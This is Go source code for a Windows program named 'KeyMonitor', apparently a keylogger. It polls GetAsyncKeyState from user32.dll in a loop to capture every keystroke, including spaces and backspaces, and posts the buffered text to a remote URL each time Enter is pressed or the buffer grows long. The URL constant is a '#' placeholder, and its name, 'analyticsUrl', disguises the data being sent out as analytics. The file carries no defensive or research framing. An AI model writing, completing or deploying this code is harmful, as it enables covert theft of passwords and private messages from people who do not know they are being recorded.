package main

import (
	"time"

	"golang.org/x/sys/windows"

	"KeyMonitor/util"
)

const analyticsUrl string = "#"

var tempString string = ""
var isPressed = make(map[string] bool)

func main() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	getKeyState := user32.NewProc("GetAsyncKeyState")

	util.RegisterUrl(analyticsUrl)

	for {
		for key, code := range util.KeyCodes {
			ret, _, _ := getKeyState.Call(uintptr(code))

			if ret & 0x8000 == 0 {
				isPressed[key] = false
				continue
			}

			if !isPressed[key] {
				if _, special := util.SpecialKeys[key]; special {
					isPressed[key] = true
					continue
				}

				if key == " [Enter]" {
					util.PostToUrl(tempString)
					tempString = ""
				} else if len(tempString) + len(key) > 1970 {
					util.PostToUrl(tempString + key)
					tempString = ""
				} else {
					if key == "Space" {
						key = " "
						tempString += key
						continue
					} else if key == "Backspace" {
						key = "\b"
						tempString += key
						continue
					}

					if len(key) > 1 {
						key = " [" + key + "]"
					}

					tempString += key
				}
			}

			isPressed[key] = true
		}

		time.Sleep(40 * time.Millisecond)
	}
}